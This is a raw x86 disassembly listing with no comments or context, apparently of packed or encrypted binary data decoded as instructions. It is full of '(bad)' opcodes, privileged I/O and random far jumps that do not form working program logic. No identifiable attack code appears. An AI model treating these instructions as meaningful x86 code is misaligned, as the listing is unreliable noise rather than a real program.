  419c89:	adc    BYTE PTR [ebp+ebp*2-0x7c5e7c11],ch
  419c90:	xchg   ecx,eax
  419c91:	popw   ss
  419c93:	xor    dl,ah
  419c95:	lds    edx,FWORD PTR [ebx]
  419c97:	push   ds
  419c98:	scas   al,BYTE PTR es:[edi]
  419c99:	mov    ds:0xdae7291c,al
  419c9e:	jns    0x419c24
  419ca0:	int    0xa2
  419ca2:	add    al,0x23
  419ca4:	push   esi
  419ca5:	(bad)  
  419ca6:	lods   al,BYTE PTR ds:[esi]
  419ca7:	retf   
  419ca8:	outs   dx,BYTE PTR ds:[esi]
  419ca9:	lock sub BYTE PTR [ebx],dl
  419cac:	test   al,0x25
  419cae:	push   ecx
  419caf:	mov    dl,0xc1
  419cb1:	xor    al,0x41
  419cb3:	rcl    DWORD PTR [ebx+0x43],1
  419cb6:	fstp   st(4)
  419cb8:	ins    DWORD PTR es:[edi],dx
  419cb9:	or     ch,BYTE PTR [edi]
  419cbb:	addr16 jne 0x419cac
  419cbe:	add    ah,BYTE PTR [eax]
  419cc0:	call   0xa2076a0f
  419cc5:	push   esp
  419cc6:	pop    edx
  419cc7:	jae    0x419ccf
  419cc9:	inc    ebp
  419cca:	inc    edx
  419ccb:	and    DWORD PTR ds:0x470e2857,ecx
  419cd1:	jo     0x419c8a
  419cd3:	gs and ebp,ecx
  419cd6:	iret   
  419cd7:	xor    al,0xf4
  419cd9:	sub    ch,ch
  419cdb:	sbb    esi,esi
  419cdd:	jmp    0x5153b7bd
  419ce2:	or     BYTE PTR [esi+eax*8],al
  419ce5:	gs hlt 
  419ce7:	push   esp
  419ce8:	xor    eax,DWORD PTR [ebx+0x3fad5b7c]
  419cee:	cmp    bl,bl
  419cf0:	push   0x8c57baf6
  419cf5:	test   al,0xc0
  419cf7:	lea    edx,[edi]
  419cf9:	xchg   ecx,eax
  419cfa:	jno    0x419cef
  419cfc:	add    BYTE PTR [edi+0x1b2adc9d],al
  419d02:	and    ebx,DWORD PTR [ecx+0x1d]
  419d05:	adc    DWORD PTR [di+0x5b],ebp
  419d09:	add    al,0xba
  419d0b:	dec    esi
  419d0c:	jnp    0x419d29
  419d0e:	mov    ecx,0x13c6d107
  419d13:	into   
  419d14:	(bad)  
  419d15:	leave  
  419d16:	or     ch,BYTE PTR [ebp-0x63dc0a7d]
  419d1c:	mov    ch,0xf1
  419d1e:	mov    esi,0xe6feb8da
  419d23:	aaa    
  419d24:	outs   dx,DWORD PTR ds:[esi]
  419d25:	out    dx,eax
  419d26:	hlt    
  419d27:	mov    dl,0xcd
  419d29:	enter  0x6c9a,0xd3
  419d2d:	xchg   esi,eax
  419d2e:	inc    ecx
  419d2f:	pop    ebp
  419d30:	inc    ebp
  419d31:	push   0xffffffbf
  419d33:	cmp    DWORD PTR [ebx+0x4815aea6],esi
  419d39:	popf   
  419d3a:	add    edi,ebx
  419d3c:	mov    edx,DWORD PTR [ecx]
  419d3e:	cmc    
  419d3f:	lahf   
  419d40:	(bad)  
  419d41:	in     al,dx
  419d42:	pop    gs
  419d44:	clc    
  419d45:	pop    esi
  419d46:	(bad)  
  419d47:	jmp    0x6795:0x31f59408
  419d4e:	mov    ebx,0xd48f6085
  419d53:	int3   
  419d54:	jle    0x419d0e
  419d56:	es shl dl,cl
  419d59:	adc    DWORD PTR [edx],esp
  419d5b:	fistp  DWORD PTR [eax+0x2c3b45df]
  419d61:	lds    eax,FWORD PTR [eax+0x41138b35]
  419d67:	inc    ebx
  419d68:	lds    edx,FWORD PTR [edx]
  419d6a:	and    al,0xd5
  419d6c:	cmp    ax,0x8485
  419d70:	dec    esi
  419d71:	dec    ebp
  419d72:	push   edi
  419d73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d74:	out    dx,eax
  419d75:	sub    al,0xbd
  419d77:	push   cs
  419d78:	sbb    DWORD PTR [ecx-0x34],ecx
  419d7b:	mov    BYTE PTR [ebp-0x2dcc0f64],cl
  419d81:	das    
  419d82:	inc    esi
  419d83:	frstor [edi]
  419d85:	loope  0x419d95
  419d87:	pusha  
  419d88:	xor    al,0x9d
  419d8a:	dec    edi
  419d8b:	xlat   BYTE PTR ds:[ebx]
  419d8c:	pop    ss
  419d8d:	mov    ds:0x73fd2005,al
  419d92:	je     0x419dc3
  419d94:	and    dh,ch
  419d96:	dec    esi
  419d97:	pop    ecx
  419d98:	jno    0x419d2f
  419d9a:	nop
  419d9b:	mov    ebx,0xd4e280e2
  419da0:	xchg   ecx,eax
  419da1:	mov    edi,0x58e9cc61
  419da6:	call   0xf027:0xd5a3521e
  419dad:	and    DWORD PTR [esi],0x2f8ed781
  419db3:	adc    al,BYTE PTR [edx]
  419db5:	dec    ebx
  419db6:	push   ebp
  419db7:	or     eax,0x81f607eb
  419dbc:	ja     0x419d4a
  419dbe:	test   DWORD PTR [edi+0x36de08c6],esp
  419dc4:	loopne 0x419dbe
  419dc6:	jnp    0x419e35
  419dc8:	leave  
  419dc9:	mov    DWORD PTR ds:[ecx],ebp
  419dcc:	sbb    al,0x51
  419dce:	dec    ebp
  419dcf:	adc    al,0x3b
  419dd1:	mov    ah,0x86
  419dd3:	loopne 0x419d8e
  419dd5:	test   eax,0xd5658871
  419dda:	fadd   st(3),st
  419ddc:	in     al,0xe7
  419dde:	ins    DWORD PTR es:[edi],dx
  419ddf:	out    dx,al
  419de0:	shl    al,cl
  419de2:	out    0xcc,eax
  419de4:	inc    ebx
  419de5:	dec    esp
  419de6:	scas   eax,DWORD PTR es:[edi]
  419de7:	out    0x1e,eax
  419de9:	nop
  419dea:	jbe    0x419db5
  419dec:	bound  edi,QWORD PTR [ecx+ebp*4-0x6a689879]
  419df3:	mov    bh,0x48
  419df5:	pop    edx
  419df6:	and    DWORD PTR [esi],edx
  419df8:	and    al,0x4
  419dfa:	ins    DWORD PTR es:[edi],dx
  419dfb:	test   al,0x6f
  419dfd:	je     0x419dbd
  419dff:	adc    DWORD PTR [edx],ebp
  419e01:	xor    bh,BYTE PTR [edx+0x413281fb]
  419e07:	add    al,0xe2
  419e09:	adc    eax,0xb14007a
  419e0e:	lds    esi,FWORD PTR [edx]
  419e10:	in     eax,dx
  419e11:	in     al,dx
  419e12:	in     eax,0x5b
  419e14:	cmp    ecx,ebp
  419e16:	sbb    al,0x9a
  419e18:	xchg   ecx,eax
  419e19:	mov    bl,BYTE PTR [eax]
  419e1b:	adc    ebp,DWORD PTR [edi]
  419e1d:	jl     0x419e5b
  419e1f:	(bad)  
  419e20:	fcom   st(5)
  419e22:	jnp    0x419e3d
  419e24:	add    DWORD PTR [ebp+0x26],esi
  419e27:	mov    ds,WORD PTR [ecx+0x2]
  419e2a:	lods   al,BYTE PTR ds:[esi]
  419e2b:	mov    edi,0xa7126fed
  419e30:	dec    ebp
  419e31:	dec    esp
  419e32:	cs daa 
  419e34:	iret   
  419e35:	sbb    edi,ebp
  419e37:	xchg   ebp,eax
  419e38:	imul   edi,DWORD PTR [esi+0x2a],0x5a899986
  419e3f:	les    ecx,FWORD PTR [ebp+0x38]
  419e42:	pop    esp
  419e43:	jl     0x419e9d
  419e45:	and    DWORD PTR [ebx-0x6f],0x3f
  419e49:	ret    
  419e4a:	xor    BYTE PTR [ebx+0x77dedded],0xdf
  419e51:	push   eax
  419e52:	pop    ebx
  419e53:	mov    DWORD PTR [ebp+0x4c],esp
  419e56:	cmp    al,0xcc
  419e58:	push   eax
  419e59:	jnp    0x419e8f
  419e5b:	and    BYTE PTR [ecx+0x3800ce5f],cl
  419e61:	sbb    DWORD PTR [edi-0x39],ecx
  419e64:	pop    eax
  419e65:	popf   
  419e66:	xchg   ecx,eax
  419e67:	aaa    
  419e68:	pop    edi
  419e69:	imul   eax,DWORD PTR [ebp+0x5d],0xffffffc4
  419e6d:	push   cs
  419e6e:	mov    eax,ds:0xbdfde731
  419e73:	enter  0x5640,0xd3
  419e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e78:	lds    esi,FWORD PTR [edx+0x3daa236e]
  419e7e:	lods   eax,DWORD PTR ds:[esi]
  419e7f:	cmp    al,0x21
  419e81:	cmc    
  419e82:	or     edi,DWORD PTR [eax]
  419e84:	or     bh,BYTE PTR [edx+0x34]
  419e87:	imul   esi,DWORD PTR [edi-0x6a2c9d3b],0x4904ce01
  419e91:	xor    DWORD PTR [ebx+0x7543b43],edi
  419e97:	(bad)  
  419e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e99:	rcr    dl,0xc1
  419e9c:	fdiv   DWORD PTR [eax+0x19]
  419e9f:	popf   
  419ea0:	shl    ecx,1
  419ea2:	retf   0x3cd7
  419ea5:	addr16 push 0xffffffae
  419ea8:	iret   
  419ea9:	cdq    
  419eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eab:	inc    ebp
  419eac:	jo     0x419e78
  419eae:	adc    edi,DWORD PTR [esi]
  419eb0:	fisubr DWORD PTR [ebp-0x3e]
  419eb3:	and    al,0x60
  419eb5:	ins    DWORD PTR es:[edi],dx
  419eb6:	xor    eax,0x78610f5e
  419ebb:	mov    ebx,esp
  419ebd:	stos   BYTE PTR es:[edi],al
  419ebe:	cmp    DWORD PTR [edi],ecx
  419ec0:	pop    esi
  419ec1:	sar    BYTE PTR [edi+0x6],cl
  419ec4:	loop   0x419ea6
  419ec6:	imul   ecx,DWORD PTR [esi+0x6b865d04],0xc3b025b0
  419ed0:	in     eax,0x45
  419ed2:	inc    edi
  419ed3:	pop    esp
  419ed4:	int    0x2f
  419ed6:	jp     0x419ebc
  419ed8:	jae    0x419f31
  419eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419edb:	in     eax,dx
  419edc:	repnz outs dx,DWORD PTR ds:[esi]
  419ede:	inc    esi
  419edf:	xchg   esi,eax
  419ee0:	(bad)  
  419ee1:	retf   0xb88b
  419ee4:	add    eax,0xe39cf580
  419ee9:	mov    eax,0xdd20cfeb
  419eee:	mov    dh,0xab
  419ef0:	jbe    0x419ef6
  419ef2:	fwait
  419ef3:	sbb    cl,BYTE PTR [edx-0x7729a2df]
  419ef9:	dec    edx
  419efa:	pop    ebx
  419efb:	sub    eax,0x689b47a9
  419f00:	cmp    BYTE PTR ds:0x4d4449cf,bh
  419f06:	retf   0xe065
  419f09:	add    eax,0x1180e55a
  419f0e:	inc    ebx
  419f0f:	lahf   
  419f10:	pmaxsw mm1,QWORD PTR [edi]
  419f13:	add    DWORD PTR [eax],eax
  419f15:	push   esp
  419f16:	xor    DWORD PTR [edx],0x628a25cf
  419f1c:	pop    DWORD PTR [esi]
  419f1e:	pop    esp
  419f1f:	push   es
  419f20:	xor    eax,0x8cc7c3ed
  419f25:	clc    
  419f26:	push   cs
  419f27:	in     eax,dx
  419f28:	jecxz  0x419ebe
  419f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f2b:	enter  0xa1a,0x8f
  419f2f:	dec    ebp
  419f30:	sbb    al,0x47
  419f32:	mov    cs,WORD PTR [edx-0xdcffbf5]
  419f38:	aam    0x34
  419f3a:	jmp    0x419f49
  419f3c:	mov    ah,0xfa
  419f3e:	fld    TBYTE PTR [esi+0x779c7603]
  419f44:	pop    ss
  419f45:	outs   dx,DWORD PTR ds:[esi]
  419f46:	loope  0x419f34
  419f48:	inc    edi
  419f49:	data16 int3 
  419f4b:	xchg   ecx,eax
  419f4c:	fbstp  TBYTE PTR [esi+0x47]
  419f4f:	test   BYTE PTR [eax+0x79],al
  419f52:	jecxz  0x419ed8
  419f54:	dec    esp
  419f55:	add    ah,dh
  419f57:	pop    ecx
  419f58:	push   esp
  419f59:	mov    db5,ebx
  419f5c:	mov    DWORD PTR [edi+0x44673ab7],edi
  419f62:	sar    BYTE PTR [edx+0x3e752610],0x46
  419f69:	push   ecx
  419f6a:	shr    DWORD PTR [edx-0x30253f89],cl
  419f70:	xchg   BYTE PTR [esi+eax*8-0x2e],dh
  419f74:	jae    0x419f4e
  419f76:	push   edi
  419f77:	add    eax,0xba135315
  419f7c:	push   ds
  419f7d:	aad    0x3f
  419f7f:	mov    esi,0x45884043
  419f84:	and    bh,0xf2
  419f87:	xor    bl,dh
  419f89:	mov    ah,0xe
  419f8b:	mov    dl,0x70
  419f8d:	mov    eax,ds:0x3e1d8b66
  419f92:	out    dx,al
  419f93:	xchg   esi,eax
  419f94:	cmp    BYTE PTR [edi-0x4],0xf6
  419f98:	stc    
  419f99:	sub    al,0xfc
  419f9b:	inc    edi
  419f9c:	cli    
  419f9d:	(bad)  
  419f9f:	test   eax,0x9931d7d6
  419fa4:	mov    al,0x32
  419fa6:	rol    DWORD PTR [ebx+eax*1],1
  419fa9:	inc    esi
  419faa:	sbb    BYTE PTR gs:[eax-0x41],al
  419fae:	arpl   bx,si
  419fb0:	mov    ah,0x21
  419fb2:	mov    ah,0xd3
  419fb4:	push   esi
  419fb5:	rcr    BYTE PTR [ebx],1
  419fb7:	aad    0xdd
  419fb9:	out    dx,al
  419fba:	sbb    edi,DWORD PTR [ebp+0x60]
  419fbd:	popf   
  419fbe:	or     DWORD PTR [ebp-0x5c],eax
  419fc1:	dec    esi
  419fc2:	retf   0x1f2c
  419fc5:	clc    
  419fc6:	test   al,0x66
  419fc8:	out    0x6d,al
  419fca:	in     al,0x44
  419fcc:	or     ecx,edi
  419fce:	shl    BYTE PTR [esi-0x7584e3b0],cl
  419fd4:	pop    ebp
  419fd5:	add    dl,BYTE PTR [ebx-0x44]
  419fd8:	pop    ebp
  419fd9:	xor    eax,0xabec68b6
  419fde:	hlt    
  419fdf:	mov    esp,0x218762b1
  419fe4:	pop    ebx
  419fe5:	jge    0x419fd2
  419fe7:	jge    0x419ff7
  419fe9:	dec    edi
  419fea:	(bad)  
  419feb:	int3   
  419fec:	xchg   ebp,eax
  419fed:	xchg   DWORD PTR [ecx],edx
  419fef:	jg     0x419f9f
  419ff1:	fwait
  419ff2:	push   0x762680a2
  419ff7:	sub    ebx,esi
  419ff9:	cmp    cl,BYTE PTR [esi-0x78]
  419ffc:	xchg   DWORD PTR [esi-0x2e],edx
  419fff:	retf   
  41a000:	cmp    bl,bh
  41a002:	xlat   BYTE PTR ds:[ebx]
  41a003:	aad    0x2d
  41a005:	clc    
  41a006:	jns    0x419fea
  41a008:	dec    eax
  41a009:	fdivrp st(5),st
  41a00b:	sbb    DWORD PTR [ebx+0x2a7c0397],0xe1973d04
  41a015:	mov    al,0x79
  41a017:	sub    edx,DWORD PTR [ecx+ecx*8+0x6a2ecf5f]
  41a01e:	add    BYTE PTR [esi+eiz*1+0xa],dl
  41a022:	mov    esp,0xc67dc019
  41a027:	stos   DWORD PTR es:[edi],eax
  41a028:	mov    al,ds:0xd7edae90
  41a02d:	out    0x9d,al
  41a02f:	xor    ecx,edx
  41a031:	ja     0x41a04d
  41a033:	add    BYTE PTR es:[eax+0x46],bh
  41a037:	or     eax,0x15989fff
  41a03c:	push   ss
  41a03d:	daa    
  41a03e:	push   edi
  41a03f:	es sti 
  41a041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a042:	jmp    0x419fff
  41a044:	mov    esp,0x86c9f091
  41a049:	dec    eax
  41a04a:	das    
  41a04b:	retf   
  41a04c:	xchg   edx,eax
  41a04d:	fs scas eax,DWORD PTR es:[edi]
  41a04f:	in     al,dx
  41a050:	jle    0x41a0cd
  41a052:	cdq    
  41a053:	mov    BYTE PTR [ecx],dl
  41a055:	jne    0x41a021
  41a057:	mov    ?,WORD PTR [esi-0x6b845c81]
  41a05d:	cmp    al,0xf2
  41a05f:	mov    edi,0xb7e3c78f
  41a064:	les    esp,FWORD PTR [edi]
  41a066:	inc    ebx
  41a067:	add    DWORD PTR [esi+eax*8+0x13],esi
  41a06b:	mov    esi,0xe8f32522
  41a070:	inc    ecx
  41a071:	mov    bl,0x18
  41a073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a074:	mov    ?,WORD PTR [ebx+0x2a3b2e41]
  41a07a:	xchg   edx,edi
  41a07c:	and    DWORD PTR [edi],0xd98fe0b5
  41a082:	xchg   esi,eax
  41a083:	scas   al,BYTE PTR es:[edi]
  41a084:	fisubr WORD PTR [ebp-0x4f5e97c2]
  41a08a:	mov    BYTE PTR [esi+esi*2],ah
  41a08d:	clc    
  41a08e:	push   ecx
  41a08f:	repnz rcl ah,cl
  41a092:	enter  0x18c1,0xb2
  41a096:	pop    esp
  41a097:	das    
  41a098:	mov    esp,0xbb930a8d
  41a09d:	pop    ds
  41a09e:	mov    eax,0x1e8e4651
  41a0a3:	std    
  41a0a4:	cmp    dl,BYTE PTR [ebx+ebx*4]
  41a0a7:	popa   
  41a0a8:	je     0x41a0e4
  41a0aa:	fnstenv [ecx]
  41a0ac:	pushf  
  41a0ad:	mov    dh,0x27
  41a0af:	cmp    DWORD PTR [esi+ecx*2-0x68],ebx
  41a0b3:	pop    ss
  41a0b4:	adc    al,0x78
  41a0b6:	and    DWORD PTR [esi+0x7eb3f2bc],edi
  41a0bc:	xchg   ah,al
  41a0be:	xchg   ebp,eax
  41a0bf:	in     eax,dx
  41a0c0:	jno    0x41a103
  41a0c2:	and    ebp,ecx
  41a0c4:	push   ss
  41a0c5:	neg    BYTE PTR [ebx+0x5a8fd8df]
  41a0cb:	xchg   edx,eax
  41a0cc:	adc    eax,0x2a774973
  41a0d1:	loop   0x41a14f
  41a0d3:	stos   BYTE PTR es:[edi],al
  41a0d4:	ja     0x41a093
  41a0d6:	repz mov cl,0x68
  41a0d9:	push   cs
  41a0da:	mov    cl,BYTE PTR ds:0xc3104f90
  41a0e0:	ss pop edi
  41a0e2:	dec    eax
  41a0e3:	in     al,0xd4
  41a0e5:	mov    dh,0x42
  41a0e7:	scas   eax,DWORD PTR es:[edi]
  41a0e8:	sbb    DWORD PTR [edx],ecx
  41a0ea:	retf   
  41a0eb:	mov    ecx,0x91f4717f
  41a0f0:	outs   dx,BYTE PTR ds:[esi]
  41a0f1:	mov    esp,0x7d665d9d
  41a0f6:	iret   
  41a0f7:	sbb    eax,0xe72f7c41
  41a0fc:	test   DWORD PTR [ebp*1-0xdcc4c16],ecx
  41a103:	cld    
  41a104:	xchg   edi,eax
  41a105:	cmp    DWORD PTR [esi],edi
  41a107:	cmp    al,0x5b
  41a109:	test   eax,0x9d3776d3
  41a10e:	stos   DWORD PTR es:[edi],eax
  41a10f:	hlt    
  41a110:	sub    al,0x10
  41a112:	hlt    
  41a113:	int3   
  41a114:	jmp    0x38313e68
  41a119:	lock xchg ebx,eax
  41a11b:	outs   dx,DWORD PTR ds:[esi]
  41a11c:	cmp    edx,esi
  41a11e:	fcom   st(6)
  41a120:	je     0x41a0aa
  41a122:	clc    
  41a123:	push   ebp
  41a124:	push   0xf6b87585
  41a129:	mov    ah,0xd2
  41a12b:	aas    
  41a12c:	jmp    0x84e6:0xf5bc0bb6
  41a133:	mov    ch,0x6e
  41a135:	nop
  41a136:	into   
  41a137:	inc    ebp
  41a138:	pop    ebp
  41a139:	outs   dx,BYTE PTR ds:[esi]
  41a13a:	shl    BYTE PTR [esi],1
  41a13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a13d:	fnstcw WORD PTR [edx+0xc84f714]
  41a143:	sti    
  41a144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a146:	fld1   
  41a148:	js     0x41a0ed
  41a14a:	jp     0x41a153
  41a14c:	add    DWORD PTR [edi-0x57f6579d],esp
  41a152:	jmp    0xdf04:0xa634ab34
  41a159:	int    0xa1
  41a15b:	sbb    BYTE PTR [ecx+0x1f4abe25],0xb6
  41a162:	cli    
  41a163:	xor    edx,edi
  41a165:	pop    ds
  41a166:	xor    cl,BYTE PTR [edi-0x7dccb5f5]
  41a16c:	test   BYTE PTR [edx],ah
  41a16e:	inc    eax
  41a16f:	fild   DWORD PTR [edx]
  41a171:	sub    bh,BYTE PTR [esi-0x5e]
  41a174:	jge    0x41a197
  41a176:	loopne 0x41a124
  41a178:	xchg   DWORD PTR ds:0x5fe91c4e,ebp
  41a17e:	scas   al,BYTE PTR es:[edi]
  41a17f:	push   cs
  41a180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a181:	xor    BYTE PTR [esi-0x56e9acd6],0x17
  41a188:	aaa    
  41a189:	mov    edx,0x4d3e12e
  41a18e:	dec    ebp
  41a18f:	outs   dx,WORD PTR ds:[esi]
  41a191:	cmp    al,0xcd
  41a193:	mov    edi,0xc219fa47
  41a198:	push   ebx
  41a199:	jmp    0xc8ac02e
  41a19e:	cld    
  41a19f:	fistp  WORD PTR [edx]
  41a1a1:	mov    dl,0xd2
  41a1a3:	and    al,0x69
  41a1a5:	call   0xc8bee49c
  41a1aa:	rcr    BYTE PTR [esi+0x72],1
  41a1ad:	cli    
  41a1ae:	fcmovbe st,st(3)
  41a1b0:	pop    ecx
  41a1b1:	dec    esp
  41a1b2:	adc    al,BYTE PTR [esp+ebp*2+0x4c23f28]
  41a1b9:	fxch   st(3)
  41a1bb:	pop    ds
  41a1bc:	sbb    edx,0x2ad5d7cd
  41a1c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1c3:	push   eax
  41a1c4:	xchg   ebp,eax
  41a1c5:	outs   dx,BYTE PTR ds:[esi]
  41a1c6:	cmp    eax,0xa9e45bbd
  41a1cb:	inc    ebx
  41a1cc:	pop    edi
  41a1cd:	add    eax,0xf55376ea
  41a1d2:	inc    ebp
  41a1d3:	(bad)  
  41a1d4:	adc    bh,dl
  41a1d6:	in     al,dx
  41a1d7:	pop    edi
  41a1d8:	sub    DWORD PTR [eax+ebx*4-0x72e7d1f9],edx
  41a1df:	push   cs
  41a1e0:	push   0xbea56299
  41a1e5:	jae    0x41a1d5
  41a1e7:	dec    esp
  41a1e8:	ret    0x5255
  41a1eb:	mov    ecx,0x5a8947b9
  41a1f0:	mov    ah,0x44
  41a1f2:	dec    ebp
  41a1f3:	and    dh,BYTE PTR [eax-0x5520759f]
  41a1f9:	pop    ss
  41a1fa:	lahf   
  41a1fb:	mov    ebx,0x9764d3f8
  41a200:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41a202:	in     al,0x76
  41a204:	jecxz  0x41a239
  41a206:	js     0x41a1a7
  41a208:	mov    ebx,0xbe31982f
  41a20d:	mov    eax,ds:0xc02833ca
  41a212:	pop    ecx
  41a213:	push   cs
  41a214:	test   BYTE PTR [eax+esi*1-0x78],ch
  41a218:	retf   0x5a4
  41a21b:	adc    DWORD PTR cs:[edi+0x14b9a94f],edi
  41a222:	retf   0xad64
  41a225:	lds    eax,FWORD PTR [ebp+0x7e015d8c]
  41a22b:	xor    DWORD PTR [ebx-0xb096ea7],edx
  41a231:	xchg   BYTE PTR es:[ecx+ecx*8-0x4547671c],dl
  41a239:	fs fcomi st,st(6)
  41a23c:	daa    
  41a23d:	or     al,BYTE PTR [ebp-0x230430be]
  41a243:	mov    ah,0xa7
  41a245:	add    dl,dl
  41a247:	cmc    
  41a248:	lds    edi,FWORD PTR [eax]
  41a24a:	fwait
  41a24b:	adc    ch,BYTE PTR [edi+ecx*4-0x56bfeae]
  41a252:	mov    WORD PTR [esi-0x5f],fs
  41a255:	outs   dx,DWORD PTR ds:[esi]
  41a256:	sub    al,0xbc
  41a258:	jb     0x41a1f5
  41a25a:	fs out 0x50,eax
  41a25d:	dec    ebx
  41a25e:	fld    QWORD PTR [edi+ebp*1]
  41a261:	jmp    0xf9bd:0xa9e09015
  41a268:	and    ecx,edx
  41a26a:	add    al,BYTE PTR [esi+ecx*2+0x670bb598]
  41a271:	ss loope 0x41a2d0
  41a274:	or     BYTE PTR [ebp+0x3],dh
  41a277:	daa    
  41a278:	loopne 0x41a28f
  41a27a:	rcl    DWORD PTR [ebp+0x7af0d9c7],1
  41a280:	into   
  41a281:	jno    0x41a2d7
  41a283:	jne    0x41a296
  41a285:	xchg   DWORD PTR [esp+edx*2],ebp
  41a288:	xor    esi,edi
  41a28a:	mov    edi,0xd51c9637
  41a28f:	mov    ebx,0xc49c5323
  41a294:	push   ebx
  41a295:	jno    0x41a299
  41a297:	aas    
  41a298:	cmp    edi,DWORD PTR [esi]
  41a29a:	aaa    
  41a29b:	in     al,0x76
  41a29d:	or     esi,DWORD PTR [edx]
  41a29f:	or     edi,DWORD PTR [eax+0x72]
  41a2a2:	mov    eax,0x96d2a25b
  41a2a7:	mov    dh,0xb1
  41a2a9:	sub    al,cl
  41a2ab:	jge    0x41a2b4
  41a2ad:	cdq    
  41a2ae:	and    al,BYTE PTR [ecx]
  41a2b0:	or     ah,BYTE PTR [edi+0x46]
  41a2b3:	sbb    BYTE PTR es:[ecx+0xb9a66e0],dl
  41a2ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2bb:	push   0xc4d6f2ea
  41a2c0:	addr16 lahf 
  41a2c2:	xchg   esp,ecx
  41a2c4:	cmc    
  41a2c5:	in     al,0x7d
  41a2c7:	(bad)  
  41a2c8:	push   ebx
  41a2ca:	scas   eax,DWORD PTR es:[edi]
  41a2cb:	rol    dl,cl
  41a2cd:	xchg   ecx,ecx
  41a2cf:	aas    
  41a2d0:	fsin   
  41a2d2:	fbstp  TBYTE PTR [eax]
  41a2d4:	pop    esi
  41a2d5:	sub    esi,DWORD PTR [edx]
  41a2d7:	sbb    al,0x43
  41a2d9:	push   edx
  41a2da:	cs mov esi,0x4357453b
  41a2e0:	xchg   ecx,eax
  41a2e1:	push   0x6df33584
  41a2e6:	jmp    0xcaac:0x90b2514b
  41a2ed:	fadd   QWORD PTR [eax]
  41a2ef:	(bad)  
  41a2f0:	(bad)  
  41a2f1:	xor    ecx,ebx
  41a2f3:	ret    0x5561
  41a2f6:	(bad)  
  41a2f7:	out    0x68,al
  41a2f9:	mov    ds:0xa5b36e3b,eax
  41a2fe:	ja     0x41a2f1
  41a300:	mov    bl,0x8a
  41a302:	aaa    
  41a303:	or     al,BYTE PTR [eax+0x48599270]
  41a309:	mov    eax,ds:0xf5da4fc8
  41a30e:	pop    ebx
  41a30f:	mov    ah,BYTE PTR [edi+0x6e]
  41a312:	sbb    BYTE PTR [edx],dl
  41a314:	push   esi
  41a315:	(bad)  
  41a316:	jno    0x41a29a
  41a318:	pop    es
  41a319:	and    ah,bl
  41a31b:	adc    eax,0x7655814b
  41a320:	fdiv   st(7),st
  41a322:	dec    edx
  41a323:	jb     0x41a306
  41a325:	push   0xffffffbb
  41a327:	and    cl,dh
  41a329:	stos   BYTE PTR es:[edi],al
  41a32a:	clc    
  41a32b:	clc    
  41a32c:	in     al,dx
  41a32d:	or     ch,BYTE PTR [ecx]
  41a32f:	lds    edi,FWORD PTR [esp+edx*1-0x6f]
  41a333:	push   esi
  41a334:	cdq    
  41a335:	lahf   
  41a336:	adc    al,0x9b
  41a339:	les    edi,FWORD PTR [esi+0x9]
  41a33c:	mov    dh,BYTE PTR [ebp+0x78d822df]
  41a342:	out    dx,eax
  41a343:	cdq    
  41a344:	push   es
  41a345:	pop    ecx
  41a346:	jnp    0x41a34f
  41a348:	ins    DWORD PTR es:[edi],dx
  41a349:	hlt    
  41a34a:	jg     0x41a350
  41a34c:	pop    ss
  41a34d:	mov    bh,0x92
  41a34f:	call   0xae5b:0xb817cc96
  41a356:	leave  
  41a357:	and    al,0xfc
  41a359:	lods   al,BYTE PTR ds:[si]
  41a35b:	pop    esp
  41a35c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a35d:	xor    DWORD PTR [bx+di-0x4],ecx
  41a361:	pop    ds
  41a362:	adc    DWORD PTR [esi-0x45],0x30775892
  41a369:	push   edi
  41a36a:	add    esp,esi
  41a36c:	pop    DWORD PTR [ebx-0x1d]
  41a36f:	xchg   edx,eax
  41a370:	aaa    
  41a371:	fild   DWORD PTR [edi]
  41a373:	mov    al,ds:0xf80f6a3
  41a378:	inc    eax
  41a379:	pop    esi
  41a37a:	stos   BYTE PTR es:[edi],al
  41a37b:	push   edx
  41a37c:	pop    ebx
  41a37d:	mov    ecx,0xef7e4320
  41a382:	addr16 inc eax
  41a384:	pop    ds
  41a385:	jg     0x41a3f0
  41a387:	cs (bad) 
  41a38a:	xor    dh,bh
  41a38c:	test   al,0x84
  41a38e:	test   DWORD PTR ss:[esi+0x6a7dd83c],ebx
  41a395:	cdq    
  41a396:	adc    al,0x62
  41a398:	test   BYTE PTR [ebp-0x4f],dh
  41a39b:	push   0x73ccd8b
  41a3a0:	push   eax
  41a3a1:	out    0xc0,eax
  41a3a3:	add    eax,0x2e248ea6
  41a3a8:	cli    
  41a3a9:	ret    0xbaa3
  41a3ac:	ror    eax,cl
  41a3ae:	and    ch,BYTE PTR [eax-0x7281d9a2]
  41a3b4:	iret   
  41a3b5:	adc    BYTE PTR [ecx+0x3924e6dd],0xf
  41a3bc:	test   al,bl
  41a3be:	into   
  41a3bf:	loope  0x41a433
  41a3c1:	cld    
  41a3c2:	mov    ds:0x845cdea4,al
  41a3c7:	dec    ebp
  41a3c8:	retf   
  41a3c9:	xor    BYTE PTR [eax+0x7b95d592],dh
  41a3cf:	sub    dh,al
  41a3d1:	dec    ebp
  41a3d2:	add    al,0xbd
  41a3d4:	shr    DWORD PTR [ebx+0x14],cl
  41a3d7:	das    
  41a3d8:	mov    al,0x15
  41a3da:	xchg   ecx,eax
  41a3db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3dc:	mov    ebp,0x7d18f916
  41a3e1:	dec    ebp
  41a3e2:	test   al,0xff
  41a3e4:	and    eax,eax
  41a3e6:	adc    BYTE PTR [ebp-0x15020756],ch
  41a3ec:	ins    DWORD PTR es:[edi],dx
